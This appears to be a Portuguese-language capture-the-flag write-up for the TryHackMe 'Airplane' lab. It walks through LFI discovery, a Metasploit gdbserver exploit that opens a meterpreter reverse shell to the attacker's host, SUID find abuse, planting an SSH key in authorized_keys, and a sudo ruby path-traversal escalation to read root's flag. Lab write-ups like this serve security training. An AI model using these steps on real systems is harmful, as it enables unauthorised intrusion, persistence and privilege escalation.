> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/tryhackme/airplane.md).

# Airplane

{% embed url="<https://tryhackme.com/r/room/airplane>" %}

**Classificação :** Medium

**Criador :** [blgsvnomer](https://tryhackme.com/p/blgsvnomer)

**Ferramentas** : Nmap, burpsuite, metasploit

Adicionar o dominio `airplane.thm` em /etc/hosts da nossa máquina

**Enumeração**

```sh
# nmap -sV -sV -p- -Pn 10.10.217.1 -oN scan
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-09 16:11 UTC
Nmap scan report for ip-10-10-217-1.eu-west-1.compute.internal (10.10.217.1)
Host is up (0.0046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10

```

Notamos que existe uma porta 8000 que pelos vistos indica um servidor web, visatamos a pagina web

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F9t0r4SJ0b6bp9Rqhahi0%2FCaptura%20de%20ecra%CC%83%202024-06-09%2C%20a%CC%80s%2013.20.26.png?alt=media&amp;token=9951a531-ae16-4174-98b9-bb17d876cba3" alt=""><figcaption></figcaption></figure>

O paramêtro `page` é vulneravel ao `LFI`&#x20;

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FRHm9bVuvfpyUGEavPdUn%2F1.png?alt=media&amp;token=36846b67-506e-412d-b172-3d74b0c8cbf8" alt=""><figcaption></figcaption></figure>

Após uma enumeração mais verbosa no servidor, encontramos o `gdbserver`uma aplicação bastante incomum rodando na porta `6048`

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FAuDQ55EIxQrvXrQqu0Hn%2F2.png?alt=media&amp;token=a56dd844-a8f1-4b7d-ae4e-f052ebe02064" alt=""><figcaption></figcaption></figure>

Encontramos como explorar o gbserver no linux criando um binário elf com msfvenom ou como alternativa usar diretamente o metasploit

```sh
msf6 exploit(multi/gdb/gdb_server_exec) > show options 

Module options (exploit/multi/gdb/gdb_server_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a process.
   RHOSTS    10.10.89.58      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                        html
   RPORT     6048             yes       The target port (TCP)


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.43.74      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   x86_64

```

Conseguimos acesso a máquina do alvo

```sh
msf6 exploit(multi/gdb/gdb_server_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell 
Process 2617 created.
Channel 2 created.
/bin/bash -i
bash: cannot set terminal process group (2597): Inappropriate ioctl for device
bash: no job control in this shell
hudson@airplane:/opt$ id
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)

```

Após isso procuramos por binarios executáveis  com o find&#x20;

```sh
hudson@airplane:/home$ find / -user carlos -perm -u=s 2>/dev/null
find / -user carlos -perm -u=s 2>/dev/null
/usr/bin/find

```

Vamos procurar por `find` no getfobins

```
find . -exec /bin/sh -p \; -quit
```

Isso nos permitiu acessar os arquivos de outro usuário

```sh
udson@airplane:/home$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
ls
carlos
hudson
cd carlos
ls
                                ...SNIP...
Public
Templates
Videos
user.txt
```

Em nossa máquina, devemos gerar uma chave publica

```
root@ip-10-10-43-74:~# ssh-keygen 
```

Enviar a chave publica criada na nossa maquina para a maquina do alvo

```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDE1VSJFDvp7dFK8iVJlc+zWYZzZaTrPAzg4DToqio4qGJCHM82kamTMbwmV9TXCxKPLiAaNgze6U5CaF9CJkC2jF+ltZJ4ivKP9cslZxz/UgptGJxDVTxtCi0VFqPq3ntw/E0mufIqPlWE4fTZ8JkgJ/MgKgbq0DeHuyMz2oUJxO4kYDrjpX7AN5ZU50Qq1taeL7yk/OufukgBCDD5v+PWn6+hgUYxGYMF0p2YbceVOfKkGxW8VM14cWVWy//HLQfZdHzFzlHvTVCk6cgOJfYj1IX+zZHqIM57ZmYkFGRgWhYEgrAQbvVcjmM+YDaV85X5fcSM8C3KA65TSzIobFRJ root@ip-10-10-43-74
' > /home/carlos/.ssh/authorized_keys
```

Iniciar uma sessão ssh com o usuario `carlos`

```sh
root@ip-10-10-43-74:~# ssh carlos@10.10.89.58
The authenticity of host '10.10.89.58 (10.10.89.58)' can't be established.
ECDSA key fingerprint is SHA256:RJRrbBrzRaN6WBmh5/0D/kOxpngC7XArEPxBegq5N20.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.89.58' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

Expanded Security Maintenance for Applications is not enabled.
ubuntu.com/esm or run: sudo pro status

the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

carlos@airplane:~$ id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),27(sudo)
```

Escalação de privilégios

```
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Todos os arquivos com a extensão .rb podem ser executado como root então criamos um script para ler a flag

```
carlos@airplane:~$ cat script-root.rb 
puts File.read('/root/root.txt')
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/script-root.rb 
```
